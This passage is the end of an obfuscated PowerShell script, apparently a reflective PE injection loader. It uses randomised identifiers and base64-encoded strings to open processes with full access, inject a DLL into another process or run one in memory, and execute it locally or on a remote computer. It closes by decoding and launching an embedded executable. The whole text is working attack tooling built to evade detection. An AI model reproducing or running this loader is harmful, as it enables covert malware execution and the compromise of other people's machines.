				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAHsAYwA5AGMAOQA2AGIANQA3ADcAZQAwAGEANAA2ADgAMgA4ADYAMQA4ADEANgA3ADQAZgBmADAANgA3ADgANQAzAH0A')))
			}
			elseif (${dd4b0e12901b4b1f91cdf002aa0a1c6e}.Count -gt 1)
			{
				${e6114540a95b43d2a937fce9b11fd12a} = ps | where { $_.Name -eq ${c9c96b577e0a468286181674ff067853} } | select ProcessName, Id, SessionId
				echo ${e6114540a95b43d2a937fce9b11fd12a}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAewBjADkAYwA5ADYAYgA1ADcANwBlADAAYQA0ADYAOAAyADgANgAxADgAMQA2ADcANABmAGYAMAA2ADcAOAA1ADMAfQAgAGYAbwB1AG4AZAAsACAAcABsAGUAYQBzAGUAIABzAHAAZQBjAGkAZgB5ACAAdABoAGUAIABwAHIAbwBjAGUAcwBzACAASQBEACAAdABvACAAaQBuAGoAZQBjAHQAIABpAG4AIAB0AG8ALgA=')))
			}
			else
			{
				${d7dce71817674a8cb3038e161abf3313} = ${dd4b0e12901b4b1f91cdf002aa0a1c6e}[0].ID
			}
		}
		if ((${d7dce71817674a8cb3038e161abf3313} -ne $null) -and (${d7dce71817674a8cb3038e161abf3313} -ne 0))
		{
			${b8098c5a8297473498a6b72001bbfcf1} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${d7dce71817674a8cb3038e161abf3313})
			if (${b8098c5a8297473498a6b72001bbfcf1} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsAZAA3AGQAYwBlADcAMQA4ADEANwA2ADcANABhADgAYwBiADMAMAAzADgAZQAxADYAMQBhAGIAZgAzADMAMQAzAH0A')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
		${d9510966a3a443f1926a3ce72ac5937f} = [IntPtr]::Zero
		if (${b8098c5a8297473498a6b72001bbfcf1} -eq [IntPtr]::Zero)
		{
			${2cede92454314fa6b8810c2e2082c36d} = c6b6bc5e4c9948e0b08ce83eca04d8e9 -c8e0d86ea0e74817acb552fc5014588b ${c8e0d86ea0e74817acb552fc5014588b} -e6db2bb213e84f06b160fdf34abced4c ${e6db2bb213e84f06b160fdf34abced4c} -aa082364f7c3405b8c53e70e1ebc7a97 ${aa082364f7c3405b8c53e70e1ebc7a97}
		}
		else
		{
			${2cede92454314fa6b8810c2e2082c36d} = c6b6bc5e4c9948e0b08ce83eca04d8e9 -c8e0d86ea0e74817acb552fc5014588b ${c8e0d86ea0e74817acb552fc5014588b} -e6db2bb213e84f06b160fdf34abced4c ${e6db2bb213e84f06b160fdf34abced4c} -b8098c5a8297473498a6b72001bbfcf1 ${b8098c5a8297473498a6b72001bbfcf1} -aa082364f7c3405b8c53e70e1ebc7a97 ${aa082364f7c3405b8c53e70e1ebc7a97}
		}
		if (${2cede92454314fa6b8810c2e2082c36d} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${d9510966a3a443f1926a3ce72ac5937f} = ${2cede92454314fa6b8810c2e2082c36d}[0]
		${c167b67ce73646d8ad4fca332c0a7a3e} = ${2cede92454314fa6b8810c2e2082c36d}[1] 
		${b5905e299da14ea186abe1140fee1a54} = a4058eb6b7e24f7f8d162c0ac15a5e95 -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${b5905e299da14ea186abe1140fee1a54}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${b8098c5a8297473498a6b72001bbfcf1} -eq [IntPtr]::Zero))
		{
	        switch (${dc106e3370e342d583b546e4de5c6324})
	        {
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${3f3029787f074555b5d248bf8261a2c4} = a6a1776ab04645f5a91d11b65d41a99d -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -b901d24efb9d4ba6b718c36dbdc6a70d $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
				    if (${3f3029787f074555b5d248bf8261a2c4} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${d0b1c8b5816647c5ac9294dad938fa29} = e90fcebe8d7842cc97fa4b1a2265a8e3 @() ([IntPtr])
				    ${76aa87ab1fc1477f8c00c3d223858b6c} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${3f3029787f074555b5d248bf8261a2c4}, ${d0b1c8b5816647c5ac9294dad938fa29})
				    [IntPtr]${66b82412df6d46b0af1665edf81a9483} = ${76aa87ab1fc1477f8c00c3d223858b6c}.Invoke()
				    ${d9597f1152e94b25abd3c7e08f8ba433} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${66b82412df6d46b0af1665edf81a9483})
				    echo ${d9597f1152e94b25abd3c7e08f8ba433}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
				    [IntPtr]${3f042dce6a894eb986d3d87441823b99} = a6a1776ab04645f5a91d11b65d41a99d -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -b901d24efb9d4ba6b718c36dbdc6a70d $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
				    if (${3f042dce6a894eb986d3d87441823b99} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${e9bc26002d154474bc7b17538ef268e6} = e90fcebe8d7842cc97fa4b1a2265a8e3 @() ([IntPtr])
				    ${47058bce109b45088219002f299c99eb} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${3f042dce6a894eb986d3d87441823b99}, ${e9bc26002d154474bc7b17538ef268e6})
				    [IntPtr]${66b82412df6d46b0af1665edf81a9483} = ${47058bce109b45088219002f299c99eb}.Invoke()
				    ${d9597f1152e94b25abd3c7e08f8ba433} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${66b82412df6d46b0af1665edf81a9483})
				    echo ${d9597f1152e94b25abd3c7e08f8ba433}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${1b5ea098ea9840c4858da6446a1fc2fb} = a6a1776ab04645f5a91d11b65d41a99d -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -b901d24efb9d4ba6b718c36dbdc6a70d $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
				    if (${1b5ea098ea9840c4858da6446a1fc2fb} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${17c0328004da45de89d1549684e2cee6} = e90fcebe8d7842cc97fa4b1a2265a8e3 @() ([Void])
				    ${2243572e145e41708db98b5cd0a31741} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${1b5ea098ea9840c4858da6446a1fc2fb}, ${17c0328004da45de89d1549684e2cee6})
				    ${2243572e145e41708db98b5cd0a31741}.Invoke() | Out-Null
	            }
	        }
		}
		elseif ((${b5905e299da14ea186abe1140fee1a54}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${b8098c5a8297473498a6b72001bbfcf1} -ne [IntPtr]::Zero))
		{
			${1b5ea098ea9840c4858da6446a1fc2fb} = a6a1776ab04645f5a91d11b65d41a99d -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f} -b901d24efb9d4ba6b718c36dbdc6a70d $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${1b5ea098ea9840c4858da6446a1fc2fb} -eq $null) -or (${1b5ea098ea9840c4858da6446a1fc2fb} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${1b5ea098ea9840c4858da6446a1fc2fb} = eaa6a815d554449ebfc9210a329090f4 ${1b5ea098ea9840c4858da6446a1fc2fb} ${d9510966a3a443f1926a3ce72ac5937f}
			${1b5ea098ea9840c4858da6446a1fc2fb} = c36a6fff11ae41aab0147e8eb916744d ${1b5ea098ea9840c4858da6446a1fc2fb} ${c167b67ce73646d8ad4fca332c0a7a3e}
			${e177cfe1613b4b2488837e5483433c99} = ef987d4149fa413e954cb531fe969a83 -de6617bbc6024f2b859287e674e79d55 ${b8098c5a8297473498a6b72001bbfcf1} -e8467a7c0eca496ebed04014d585d83a ${1b5ea098ea9840c4858da6446a1fc2fb} -Win32Functions $Win32Functions
		}
		if (${b8098c5a8297473498a6b72001bbfcf1} -eq [IntPtr]::Zero -and ${b5905e299da14ea186abe1140fee1a54}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			e14aaa59745542a2a0e56de24b269161 -d9510966a3a443f1926a3ce72ac5937f ${d9510966a3a443f1926a3ce72ac5937f}
		}
		else
		{
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.VirtualFree.Invoke(${d9510966a3a443f1926a3ce72ac5937f}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	cb61d96575974b77be735598620e62fd
}
Function cb61d96575974b77be735598620e62fd
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	${106b77d783234269a195843991d4395c} = (${c8e0d86ea0e74817acb552fc5014588b}[0..1] | % {[Char] $_}) -join ''
    if (${106b77d783234269a195843991d4395c} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
	if (-not ${aba1458cbbcf4013af75a20e17d74ec2}) {
		${c8e0d86ea0e74817acb552fc5014588b}[0] = 0
		${c8e0d86ea0e74817acb552fc5014588b}[1] = 0
	}
	if (${e6db2bb213e84f06b160fdf34abced4c} -ne $null -and ${e6db2bb213e84f06b160fdf34abced4c} -ne '')
	{
		${e6db2bb213e84f06b160fdf34abced4c} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAgACQAewBlADYAZABiADIAYgBiADIAMQAzAGUAOAA0AGYAMAA2AGIAMQA2ADAAZgBkAGYAMwA0AGEAYgBjAGUAZAA0AGMAfQA=')))
	}
	else
	{
		${e6db2bb213e84f06b160fdf34abced4c} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
	}
	if (${d2da5a44b3624cd4b8654ec2e55219a6} -eq $null -or ${d2da5a44b3624cd4b8654ec2e55219a6} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${188b2d8d67304cdb8a18cedc298645cb} -ArgumentList @(${c8e0d86ea0e74817acb552fc5014588b}, ${dc106e3370e342d583b546e4de5c6324}, ${d7dce71817674a8cb3038e161abf3313}, ${c9c96b577e0a468286181674ff067853},${aa082364f7c3405b8c53e70e1ebc7a97})
	}
	else
	{
		icm -ScriptBlock ${188b2d8d67304cdb8a18cedc298645cb} -ArgumentList @(${c8e0d86ea0e74817acb552fc5014588b}, ${dc106e3370e342d583b546e4de5c6324}, ${d7dce71817674a8cb3038e161abf3313}, ${c9c96b577e0a468286181674ff067853},${aa082364f7c3405b8c53e70e1ebc7a97}) -ComputerName ${d2da5a44b3624cd4b8654ec2e55219a6}
	}
}
cb61d96575974b77be735598620e62fd
}
 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]${c8e0d86ea0e74817acb552fc5014588b} = [Byte[]][Convert]::FromBase64String(${0954928f35e84128a4a81bdc3d7a1bf3})
 }
 else
 {
       [Byte[]]${c8e0d86ea0e74817acb552fc5014588b} = [Byte[]][Convert]::FromBase64String(${f3f5af7cd7bc4d60b739793efb6ef39f})
 }
c6b6b70a989c48afb55d0747cd50e5fb -c8e0d86ea0e74817acb552fc5014588b ${c8e0d86ea0e74817acb552fc5014588b} -e6db2bb213e84f06b160fdf34abced4c $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABuAHUAbQBiAGUAcgAgACQAYwBvAG0AbQBhAG4AZAA=')))
 }